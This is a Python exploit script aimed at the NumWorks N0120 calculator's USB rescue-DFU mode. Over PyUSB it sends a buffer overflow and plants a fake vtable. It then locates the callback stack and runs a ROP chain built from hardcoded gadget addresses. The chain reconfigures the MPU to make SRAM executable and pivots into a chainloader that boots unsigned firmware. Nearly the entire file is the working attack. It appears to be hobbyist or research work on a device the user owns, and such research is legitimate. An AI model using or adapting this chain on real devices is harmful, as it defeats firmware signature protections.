#!/usr/bin/env python3
"""Boot the modified Slot B image through the NumWorks N0120 rescue-DFU RCE."""

import argparse
import struct
import time
from pathlib import Path

ROOT = Path(__file__).parent
FLASH = (ROOT / "firmware" / "internal-flash-live.bin").read_bytes()
CHAINLOADER = (ROOT / "payloads" / "xip-chainloader.bin").read_bytes()

BASE = 0x24000000
RAM_SIZE = 0x50000
FAKE_VTABLE = BASE + 0x80
STAGE = BASE + 0x10000
MARKER = STAGE + 0xC0
WARM = BASE + 0x1F000
TRANSFER = 2048
TIMEOUT = 4000

POP_R0_R1_R2_R4_R6_R7_PC = 0x0800A8EF
POP_R3_PC = 0x08003687
BX_R3 = 0x08007B07
MEMMOVE = 0x080035D3
PIVOT = 0x08008331
INITIAL_CALLBACK = 0x08006015
NESTED_PIVOT = 0x0800795D

STOCK_CALLBACK = 0x08007CED
EXPECTED_BYTE = 0x5A
MARKER_VALUE = 0xD00DFEED
STOCK_SETTER = 0x08001765
MPU_RNR = 0xE000ED98
MPU_RASR = 0xE000EDA0
MPU_RASR_VALUE = 0x010B0039
SRAM_CODE = STAGE + 0x200
SRAM_STACK = STAGE + 0x300
SRAM_MARKER = STAGE + 0x1F0
WORD_STORE = 0x080017D1


def word(data, offset):
    return struct.unpack_from("<I", data, offset)[0]


def put(data, offset, value):
    struct.pack_into("<I", data, offset, value)


def pyusb():
    try:
        import usb.core
        import usb.util
    except ModuleNotFoundError as exc:
        raise SystemExit("PyUSB is required. Run: python3 -m pip install -r requirements.txt") from exc
    return usb.core, usb.util


def device():
    usb_core, usb_util = pyusb()
    d = usb_core.find(idVendor=0x0483, idProduct=0xA291)
    if d is None:
        raise SystemExit(
            "ERROR: rescue DFU device 0483:a291 not found. "
            "Enter rescue DFU with 6 + rear RESET, then try again."
        )
    try:
        d.get_active_configuration()
    except usb_core.USBError:
        d.set_configuration()
    try:
        usb_util.claim_interface(d, 0)
    except usb_core.USBError as exc:
        raise SystemExit(
            "ERROR: USB access to rescue DFU was denied. "
            "Check the device permissions and try again."
        ) from exc
    try:
        d.ctrl_transfer(0x01, 11, 1, 0, None, TIMEOUT)
    except usb_core.USBError:
        try:
            raw = bytes(d.ctrl_transfer(0xA1, 3, 0, 0, 6, TIMEOUT))
        except usb_core.USBError as exc:
            usb_util.dispose_resources(d)
            raise SystemExit(
                "ERROR: USB device is not responding as rescue DFU. "
                "Enter rescue DFU with 6 + rear RESET, then try again."
            ) from exc
        if raw[0] != 0:
            usb_util.dispose_resources(d)
            raise SystemExit(
                f"ERROR: rescue DFU reported an error state ({raw[0]}). "
                "Return the calculator to rescue DFU and try again."
            )
    try:
        idle(d)
    except (AssertionError, RuntimeError, usb_core.USBError) as exc:
        usb_util.dispose_resources(d)
        raise SystemExit(
            f"ERROR: rescue DFU is not ready for a transfer ({exc}). "
            "Return the calculator to rescue DFU and try again."
        ) from exc
    return d, usb_core, usb_util


def status(d):
    raw = bytes(d.ctrl_transfer(0xA1, 3, 0, 0, 6, TIMEOUT))
    assert raw[0] == 0, f"DFU status error {raw[0]}"
    delay = raw[1] | raw[2] << 8 | raw[3] << 16
    if delay:
        time.sleep(delay / 1000)
    return raw[4]


def ready(d):
    for _ in range(12):
        state = status(d)
        if state not in (3, 4):
            assert state in (2, 5, 9), f"unexpected DFU state {state}"
            return state
    raise RuntimeError("DFU stayed busy")


def idle(d):
    state = status(d)
    if state in (3, 4):
        state = ready(d)
    if state in (5, 9):
        d.ctrl_transfer(0x21, 6, 0, 0, None, TIMEOUT)
        state = ready(d)
    assert state == 2, f"DFU is not idle: state {state}"


def download(d, block, data):
    d.ctrl_transfer(0x21, 1, block, 0, data, TIMEOUT)
    return ready(d)


def set_address(d, address):
    idle(d)
    download(d, 0, bytes((0x21,)) + struct.pack("<I", address))


def abort(d):
    d.ctrl_transfer(0x21, 6, 0, 0, None, TIMEOUT)
    ready(d)


def write_memory(d, address, data):
    for offset in range(0, len(data), TRANSFER):
        set_address(d, address + offset)
        download(d, 2, data[offset:offset + TRANSFER])


def read_memory(d, address, size):
    set_address(d, address)
    abort(d)
    result = bytearray()
    while len(result) < size:
        amount = min(TRANSFER, size - len(result))
        block = 2 + len(result) // TRANSFER
        result += bytes(d.ctrl_transfer(0xA1, 2, block, 0, amount, TIMEOUT))
    abort(d)
    return bytes(result)


def stock_vtable(callback=STOCK_CALLBACK):
    table = bytearray(FLASH[0xA2E8:0xA3E8])
    assert word(table, 8) == STOCK_CALLBACK
    assert word(table, 12) == STOCK_SETTER
    put(table, 8, callback)
    return table


def fake_hits(before, after):
    hits = []
    for offset in range(0, len(after) - 4, 4):
        if word(after, offset) == FAKE_VTABLE:
            target = offset + 0x824
            if target < len(after):
                hits.append((BASE + offset, before[target], after[target]))
    return hits


def build_stage(fake_vtable):
    stage = bytearray(0x200)
    pivot_table = STAGE + 0x1E0

    # Write the marker, then restore the modified callback before booting.
    put(stage, 0x00, MARKER)
    put(stage, 0x04, STAGE + 0x1C0)
    put(stage, 0x08, 4)
    put(stage, 0x18, POP_R3_PC)
    put(stage, 0x1C, MEMMOVE)
    put(stage, 0x20, BX_R3)
    put(stage, 0x30, POP_R0_R1_R2_R4_R6_R7_PC)
    put(stage, 0x34, fake_vtable + 8)
    put(stage, 0x38, STAGE + 0x1C4)
    put(stage, 0x3C, 4)
    put(stage, 0x4C, POP_R3_PC)
    put(stage, 0x50, MEMMOVE)
    put(stage, 0x54, BX_R3)
    put(stage, 0x64, POP_R0_R1_R2_R4_R6_R7_PC)

    # Make SRAM executable, then transfer to the XIP chainloader in SRAM.
    put(stage, 0x68, MPU_RNR - 0x824)
    put(stage, 0x6C, 2)
    put(stage, 0x80, POP_R3_PC)
    put(stage, 0x84, STOCK_SETTER)
    put(stage, 0x88, BX_R3)
    put(stage, 0x98, POP_R0_R1_R2_R4_R6_R7_PC)
    put(stage, 0x9C, MPU_RASR)
    put(stage, 0xA4, MPU_RASR_VALUE)
    put(stage, 0xB4, POP_R3_PC)
    put(stage, 0xB8, WORD_STORE)
    put(stage, 0xBC, BX_R3)
    put(stage, 0xC4, pivot_table)
    put(stage, 0xCC, POP_R3_PC)
    put(stage, 0xD0, PIVOT)
    put(stage, 0xD4, BX_R3)
    put(stage, 0xDC, pivot_table)
    put(stage, 0x1C0, MARKER_VALUE)
    put(stage, 0x1C4, STOCK_CALLBACK)
    put(stage, 0x1E0, SRAM_STACK)
    put(stage, 0x1E4, SRAM_CODE | 1)
    return stage


def main():
    print(""" 
     ________  __               __                  
    |  |  |  ||__|.----..-----.|  |--..---.-..--.--.
    |  |  |  ||  ||   _||  -__||     ||  _  ||_   _|
    |________||__||__|  |_____||__|__||___._||__.__|
""")
    parser = argparse.ArgumentParser(
        description="Boot the modified Slot B image through the rescue-DFU RCE."
    )
    parser.add_argument("--self-check", action="store_true", help="verify bundled assets and ROP layout")
    args = parser.parse_args()
    assert CHAINLOADER and len(CHAINLOADER) <= 0x100, "invalid chainloader payload"
    if args.self_check:
        stage = build_stage(FAKE_VTABLE)
        assert word(stage, 0x84) == STOCK_SETTER
        assert word(stage, 0xB8) == WORD_STORE
        assert word(stage, 0x1E4) == SRAM_CODE | 1
        print("SELF_CHECK_OK")
        return

    d, usb_core, usb_util = device()
    try:
        before = read_memory(d, BASE, RAM_SIZE)
        probe_table = stock_vtable()
        write_memory(d, FAKE_VTABLE, probe_table)
        assert read_memory(d, FAKE_VTABLE, len(probe_table)) == probe_table

        probe = bytearray(0x93C)
        put(probe, 0x938, FAKE_VTABLE)
        set_address(d, WARM)
        print(f"probe_overflow_sent={d.ctrl_transfer(0x21, 1, 2, 0, probe, TIMEOUT)}")
        print(f"probe_status={ready(d)}")
        print(f"probe_trigger={d.ctrl_transfer(0x01, 11, EXPECTED_BYTE, 0, None, TIMEOUT)}")

        after = read_memory(d, BASE, RAM_SIZE)
        roots = [address for address, old, new in fake_hits(before, after)
                 if old != EXPECTED_BYTE and new == EXPECTED_BYTE]
        assert len(roots) == 1, f"expected one fresh root, found {[hex(root) for root in roots]}"
        root = roots[0]
        print(f"fresh_root=0x{root:08x} callback_sp=0x{root - 0x9BC:08x}")

        dynamic_vtable = root - 0x138
        stage = build_stage(dynamic_vtable)
        write_memory(d, MARKER, bytes(4))
        write_memory(d, SRAM_MARKER, bytes(4))
        write_memory(d, SRAM_CODE, CHAINLOADER)
        assert read_memory(d, SRAM_CODE, len(CHAINLOADER)) == CHAINLOADER
        write_memory(d, STAGE, stage)
        assert read_memory(d, STAGE, len(stage)) == stage

        payload = bytearray(0x93C)
        put(payload, 8, STAGE)
        put(payload, 12, POP_R0_R1_R2_R4_R6_R7_PC)
        table = stock_vtable(INITIAL_CALLBACK)
        put(table, 16, NESTED_PIVOT)
        payload[0x800:0x800 + len(table)] = table
        put(payload, 0x938, dynamic_vtable)

        set_address(d, WARM)
        print(f"rop_overflow_sent={d.ctrl_transfer(0x21, 1, 2, 0, payload, TIMEOUT)}")
        try:
            print(f"rop_trigger={d.ctrl_transfer(0x01, 6, 0, 0, None, TIMEOUT)}")
        except usb_core.USBError as exc:
            print(f"DFU_DISCONNECT_EXPECTED: {exc}")
        print("BOOT_ATTEMPT_SENT: the calculator should now have booted unsigned firmware from Slot B!")
    finally:
        usb_util.dispose_resources(d)


if __name__ == "__main__":
    main()
